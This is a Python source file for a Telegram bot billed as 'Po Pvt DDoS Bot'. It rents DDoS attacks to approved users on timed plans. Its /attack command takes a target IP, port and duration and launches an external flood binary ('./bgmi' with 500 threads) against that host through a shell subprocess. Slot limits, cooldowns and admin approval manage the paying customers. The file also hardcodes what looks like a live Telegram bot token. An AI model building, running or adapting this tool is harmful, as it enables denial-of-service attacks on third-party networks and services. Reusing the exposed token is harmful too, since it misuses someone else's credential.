import os
import telebot
import logging
import subprocess
import threading
import time
import json
from datetime import datetime, timedelta

# Setup
logging.basicConfig(level=logging.INFO)
TOKEN = "7637579502:AAGAiIoxJVGOLvile_PBmVumIqmCZ8pUMIk"
ADMIN_IDS = [1347675113]

bot = telebot.TeleBot(TOKEN)

# ============================================
# DATA STRUCTURES
# ============================================
user_attacks = {}
user_cooldowns = {}
active_attacks = {}  # {attack_id: {'user_id': xxx, 'target': xxx, 'end_time': xxx, 'duration': xxx}}
attack_counter = 0
attack_lock = threading.Lock()

# Slot system
MAX_ACTIVE_ATTACKS = 5  # Maximum 5 concurrent attacks
FREE_SLOTS = MAX_ACTIVE_ATTACKS

# User plans
USER_PLANS = {}  # {user_id: {'plan': 300, 'expiry': datetime, 'approved': True}}
APPROVED_USERS_FILE = "approved_users.json"
USER_PLANS_FILE = "user_plans.json"

# ============================================
# FILE HANDLING
# ============================================
def load_approved_users():
    try:
        with open(APPROVED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    except FileNotFoundError:
        return set()

def save_approved_users():
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(list(APPROVED_USERS), f)

def load_user_plans():
    try:
        with open(USER_PLANS_FILE, 'r') as f:
            data = json.load(f)
            # Convert expiry strings back to datetime
            for uid, plan in data.items():
                plan['expiry'] = datetime.fromisoformat(plan['expiry'])
            return data
    except FileNotFoundError:
        return {}

def save_user_plans():
    data = {}
    for uid, plan in USER_PLANS.items():
        data[uid] = {
            'plan': plan['plan'],
            'expiry': plan['expiry'].isoformat(),
            'approved': plan['approved']
        }
    with open(USER_PLANS_FILE, 'w') as f:
        json.dump(data, f)

APPROVED_USERS = load_approved_users()
USER_PLANS = load_user_plans()

# ============================================
# HELPER FUNCTIONS
# ============================================
def get_free_slots():
    with attack_lock:
        current_attacks = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
        return MAX_ACTIVE_ATTACKS - current_attacks

def get_active_attacks_count():
    with attack_lock:
        return len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])

def cleanup_old_attacks():
    with attack_lock:
        now = datetime.now()
        expired = [aid for aid, attack in active_attacks.items() if attack['end_time'] <= now]
        for aid in expired:
            del active_attacks[aid]

def is_approved(user_id):
    if user_id in ADMIN_IDS:
        return True
    if user_id in USER_PLANS:
        plan = USER_PLANS[user_id]
        if plan['expiry'] > datetime.now() and plan.get('approved', False):
            return True
    return user_id in APPROVED_USERS

def get_user_plan_info(user_id):
    if user_id in ADMIN_IDS:
        return {'plan': 'Admin', 'expiry': 'Lifetime', 'approved': True}
    if user_id in USER_PLANS:
        plan = USER_PLANS[user_id]
        days_left = (plan['expiry'] - datetime.now()).days
        return {
            'plan': plan['plan'],
            'expiry': plan['expiry'].strftime('%Y-%m-%d %H:%M:%S'),
            'days_left': days_left,
            'approved': plan.get('approved', False)
        }
    return None

def approve_user_with_plan(user_id, plan_duration=300):
    expiry = datetime.now() + timedelta(days=1)  # 1 day plan
    USER_PLANS[user_id] = {
        'plan': plan_duration,
        'expiry': expiry,
        'approved': True
    }
    APPROVED_USERS.add(user_id)
    save_user_plans()
    save_approved_users()

# ============================================
# COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    free_slots = get_free_slots()
    
    if is_approved(user_id):
        plan_info = get_user_plan_info(user_id)
        status_text = f"✅ *APPROVED*\n📋 *Plan:* {plan_info['plan']}s\n⏰ *Valid:* {plan_info.get('days_left', 'Lifetime')} days left"
    else:
        status_text = "⏳ *PENDING APPROVAL*\nContact owner for approval"
    
    welcome_msg = (
        f"🎯 *Po Pvt DDoS Bot*\n\n"
        f"👤 *User:* @{username}\n"
        f"{status_text}\n\n"
        f"📌 *Commands:*\n"
        f"🔹 /attack IP PORT TIME - Launch attack\n"
        f"🔹 /status - Check slots & active attacks\n"
        f"🔹 /myinfo - Your account info\n"
        f"🔹 /when - Your attack remaining time\n"
        f"🔹 /rules - Bot rules\n"
        f"🔹 /owner - Contact info\n"
        f"🔹 /canary - HttpCanary download\n\n"
        f"🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free"
    )
    bot.reply_to(message, welcome_msg, parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    global attack_counter
    
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # Check approval
    if not is_approved(user_id):
        bot.reply_to(
            message,
            f"❌ *Access Denied!*\n\nYour account is not approved.\nContact /owner for approval.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
            parse_mode="Markdown"
        )
        return
    
    # Check if user has valid plan
    plan_info = get_user_plan_info(user_id)
    if plan_info and plan_info.get('days_left', 0) < 0 and user_id not in ADMIN_IDS:
        bot.reply_to(
            message,
            f"❌ *Plan Expired!*\n\nYour plan has expired. Contact /owner to renew.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
            parse_mode="Markdown"
        )
        return
    
    # Check cooldown
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = int((user_cooldowns[user_id] - datetime.now()).seconds)
        free_slots = get_free_slots()
        bot.reply_to(
            message,
            f"⏰ *Cooldown Active!*\n\nPlease wait {remaining} seconds before next attack.\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
            parse_mode="Markdown"
        )
        return
    
    # Check daily limit (for non-admin)
    if user_id not in ADMIN_IDS:
        if user_attacks.get(user_id, 0) >= 50:
            bot.reply_to(
                message,
                f"❌ *Daily Limit Reached!*\n\nYou have reached 50 attacks per day limit.\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free",
                parse_mode="Markdown"
            )
            return
    
    # Check available slots
    free_slots = get_free_slots()
    if free_slots <= 0:
        bot.reply_to(
            message,
            f"❌ *API Error!*\n\nYou have {MAX_ACTIVE_ATTACKS} active attacks. Maximum allowed: {MAX_ACTIVE_ATTACKS}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
            parse_mode="Markdown"
        )
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(
                message,
                f"✅ *Ready to launch an attack?*\n\nFormat: `/attack <ip> <port> <duration>`\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
                parse_mode="Markdown"
            )
            return
        
        ip, port, time_val = args
        
        # Validation
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            bot.reply_to(message, f"❌ *Invalid IP address!*\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
            return
        
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            bot.reply_to(message, f"❌ *Invalid port!* (1-65535)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
            return
        
        duration = int(time_val)
        if duration < 1 or duration > 300:
            bot.reply_to(message, f"❌ *Invalid duration!* (1-300 seconds)\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")
            return
        
        # Update stats
        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=30)
        
        # Create attack record
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            end_time = datetime.now() + timedelta(seconds=duration)
            active_attacks[attack_id] = {
                'user_id': user_id,
                'username': username,
                'target': f"{ip}:{port}",
                'end_time': end_time,
                'duration': duration,
                'start_time': datetime.now()
            }
        
        remaining_slots = get_free_slots()
        
        # Send attack started message
        bot.reply_to(
            message,
            f"🚀 *Attack Initiated!*\n\n"
            f"🎯 *Target:* {ip}:{port}\n"
            f"⏰ *Duration:* {duration}s\n"
            f"⏳ *Time left:* {duration}s\n"
            f"🔧 *Threads:* 500\n\n"
            f"🟢 *Free Slots:* {remaining_slots}/{MAX_ACTIVE_ATTACKS}\n"
            f"📊 *Slot Status:* {remaining_slots}/{MAX_ACTIVE_ATTACKS} free",
            parse_mode="Markdown"
        )
        
        # Start attack thread
        attack_thread = threading.Thread(
            target=execute_attack_with_timer,
            args=(attack_id, ip, int(port), duration, username, user_id, message.chat.id)
        )
        attack_thread.daemon = True
        attack_thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* {str(e)}\n\n🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    
    if not is_approved(user_id):
        bot.reply_to(message, f"❌ *Access Denied!*\nContact /owner for approval.", parse_mode="Markdown")
        return
    
    free_slots = get_free_slots()
    active_count = get_active_attacks_count()
    
    # Get user's active attacks
    user_active = []
    with attack_lock:
        for aid, attack in active_attacks.items():
            if attack['user_id'] == user_id and attack['end_time'] > datetime.now():
                remaining = int((attack['end_time'] - datetime.now()).seconds)
                user_active.append(f"• {attack['target']} - {remaining}s left")
    
    status_msg = (
        f"📊 *Attack Status*\n\n"
        f"🟢 *Free Slots:* {free_slots}/{MAX_ACTIVE_ATTACKS}\n"
        f"⚡ *Active Attacks:* {active_count}/{MAX_ACTIVE_ATTACKS}\n\n"
        f"👤 *Your Active Attacks:*\n"
    )
    
    if user_active:
        status_msg += "\n".join(user_active)
    else:
        status_msg += "No active attacks"
    
    status_msg += f"\n\n📈 *Total Today:* {user_attacks.get(user_id, 0)}/50"
    
    bot.reply_to(message, status_msg, parse_mode="Markdown")

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if not is_approved(user_id):
        bot.reply_to(message, f"❌ *Access Denied!*\nContact /owner for approval.", parse_mode="Markdown")
        return
    
    plan_info = get_user_plan_info(user_id)
    
    if plan_info:
        info_msg = (
            f"👤 *User Info*\n\n"
            f"📛 *Username:* @{username}\n"
            f"🆔 *User ID:* `{user_id}`\n"
            f"✅ *Status:* Approved\n"
            f"📋 *Plan:* {plan_info['plan']} seconds\n"
            f"⏰ *Valid for:* {plan_info.get('days_left', 'Lifetime')} days\n"
            f"📅 *Expiry:* {plan_info.get('expiry', 'Never')}\n\n"
            f"📊 *Today's Attacks:* {user_attacks.get(user_id, 0)}/50\n"
            f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
        )
    else:
        info_msg = (
            f"👤 *User Info*\n\n"
            f"📛 *Username:* @{username}\n"
            f"🆔 *User ID:* `{user_id}`\n"
            f"⏳ *Status:* Pending Approval\n\n"
            f"Contact /owner to get approved"
        )
    
    bot.reply_to(message, info_msg, parse_mode="Markdown")

@bot.message_handler(commands=['when'])
def when_command(message):
    user_id = message.from_user.id
    
    if not is_approved(user_id):
        bot.reply_to(message, f"❌ *Access Denied!*", parse_mode="Markdown")
        return
    
    # Get user's active attacks
    user_active = []
    with attack_lock:
        for aid, attack in active_attacks.items():
            if attack['user_id'] == user_id and attack['end_time'] > datetime.now():
                remaining = int((attack['end_time'] - datetime.now()).seconds)
                user_active.append((attack['target'], remaining))
    
    if user_active:
        msg = "⏰ *Your Attack Remaining Time*\n\n"
        for target, remaining in user_active:
            msg += f"🎯 {target}\n   ⏳ *{remaining} seconds left*\n\n"
    else:
        msg = "✅ *No active attacks*\n\nYou don't have any running attacks at the moment."
    
    msg += f"\n🟢 *Free Slots:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS}"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_msg = (
        f"📜 *Bot Rules*\n\n"
        f"1️⃣ Use attacks responsibly\n"
        f"2️⃣ Maximum 50 attacks per day\n"
        f"3️⃣ Maximum 300 seconds per attack\n"
        f"4️⃣ 30 seconds cooldown between attacks\n"
        f"5️⃣ Max {MAX_ACTIVE_ATTACKS} concurrent attacks\n"
        f"6️⃣ Don't share bot with others\n"
        f"7️⃣ No attacking educational/government sites\n\n"
        f"⚠️ *Violation may lead to ban!*\n\n"
        f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
    )
    bot.reply_to(message, rules_msg, parse_mode="Markdown")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    owner_msg = (
        f"👑 *Bot Owner*\n\n"
        f"For approval, support, or queries:\n"
        f"🆔 Admin ID: `{ADMIN_IDS[0]}`\n"
        f"💬 Contact: @Pk_Chopra\n\n"
        f"💡 *To get approved:*\n"
        f"Send your User ID to admin\n\n"
        f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
    )
    bot.reply_to(message, owner_msg, parse_mode="Markdown")

@bot.message_handler(commands=['canary'])
def canary_command(message):
    canary_msg = (
        f"🐦 *HttpCanary Download*\n\n"
        f"Download HttpCanary for packet capture:\n"
        f"📱 *Android:* Google Play Store\n"
        f"🔗 *Direct:* https://httpcanary.com/download\n\n"
        f"Use it to capture and analyze network packets\n\n"
        f"🟢 *Slot Status:* {get_free_slots()}/{MAX_ACTIVE_ATTACKS} free"
    )
    bot.reply_to(message, canary_msg, parse_mode="Markdown")

# ============================================
# ADMIN COMMANDS
# ============================================

@bot.message_handler(commands=['approve'])
def approve_user_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ *Usage:* `/approve <user_id> [plan_duration]`", parse_mode="Markdown")
            return
        
        target_id = int(args[1])
        plan_duration = int(args[2]) if len(args) > 2 else 300
        
        approve_user_with_plan(target_id, plan_duration)
        bot.reply_to(
            message,
            f"✅ *User Approved!*\n\nUser ID: `{target_id}`\n📋 Plan: {plan_duration}s\n⏰ Valid for: 1 day\n\nThey can now use /attack command",
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* {str(e)}", parse_mode="Markdown")

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode="Markdown")
            return
        
        target_id = int(args[1])
        
        if target_id in ADMIN_IDS:
            bot.reply_to(message, "❌ *Cannot remove admin!*", parse_mode="Markdown")
            return
        
        APPROVED_USERS.discard(target_id)
        if str(target_id) in USER_PLANS:
            del USER_PLANS[str(target_id)]
        save_user_plans()
        save_approved_users()
        
        bot.reply_to(message, f"❌ *User Removed!*\n\nUser ID: `{target_id}`\nApproval revoked.", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* {str(e)}", parse_mode="Markdown")

@bot.message_handler(commands=['reset_TF'])
def reset_all_limits(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
        return
    
    user_attacks.clear()
    user_cooldowns.clear()
    bot.reply_to(message, "🔄 *All limits have been reset by ADMIN!*", parse_mode="Markdown")

@bot.message_handler(commands=['slots'])
def slots_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ *Admin only command!*", parse_mode="Markdown")
        return
    
    free_slots = get_free_slots()
    active_count = get_active_attacks_count()
    
    msg = f"📊 *Server Status*\n\n🟢 Free Slots: {free_slots}/{MAX_ACTIVE_ATTACKS}\n⚡ Active Attacks: {active_count}/{MAX_ACTIVE_ATTACKS}\n\n"
    
    with attack_lock:
        for aid, attack in active_attacks.items():
            if attack['end_time'] > datetime.now():
                remaining = int((attack['end_time'] - datetime.now()).seconds)
                msg += f"🔹 #{aid}: {attack['target']} - {remaining}s - @{attack['username']}\n"
    
    bot.reply_to(message, msg, parse_mode="Markdown")

# ============================================
# ATTACK EXECUTION
# ============================================

def execute_attack_with_timer(attack_id, ip, port, duration, username, user_id, chat_id):
    try:
        cmd = f"./bgmi {ip} {port} {duration} 500"
        logging.info(f"Executing: {cmd}")
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable='/bin/bash')
        
        # Send updates every 30 seconds
        for remaining in range(duration, 0, -30):
            if remaining > 0:
                time.sleep(30)
                # Check if attack still exists
                with attack_lock:
                    if attack_id not in active_attacks:
                        process.kill()
                        return
        
        stdout, stderr = process.communicate(timeout=duration + 10)
        
        # Send completion message
        free_slots = get_free_slots()
        bot.send_message(
            chat_id,
            f"✅ *Attack Completed!*\n\n🎯 Target: {ip}:{port}\n⏰ Duration: {duration}s\n👤 By: @{username}\n\n🟢 *Slot Status:* {free_slots}/{MAX_ACTIVE_ATTACKS} free",
            parse_mode="Markdown"
        )
        
        # Notify admin
        bot.send_message(
            ADMIN_IDS[0],
            f"✅ *Attack Completed*\n🎯 {ip}:{port}\n👤 @{username}\n⏰ {duration}s",
            parse_mode="Markdown"
        )
        
    except subprocess.TimeoutExpired:
        process.kill()
        bot.send_message(ADMIN_IDS[0], f"⚠️ *Attack Timeout*\n🎯 {ip}:{port}\n👤 @{username}", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(ADMIN_IDS[0], f"❌ *Attack Failed*\n👤 @{username}\nError: {str(e)}", parse_mode="Markdown")
    finally:
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

# ============================================
# CLEANUP THREAD
# ============================================

def cleanup_thread():
    while True:
        time.sleep(10)
        cleanup_old_attacks()

# Start cleanup thread
cleanup_thread_obj = threading.Thread(target=cleanup_thread, daemon=True)
cleanup_thread_obj.start()

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print("=" * 50)
    print("🎯 Po Pvt DDoS Bot Starting...")
    print("=" * 50)
    print(f"📊 Max Attacks: {MAX_ACTIVE_ATTACKS}")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"✅ Approved Users: {len(APPROVED_USERS)}")
    print(f"🟢 Free Slots: {MAX_ACTIVE_ATTACKS}")
    print("=" * 50)
    print("✅ Bot is running...")
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(15)
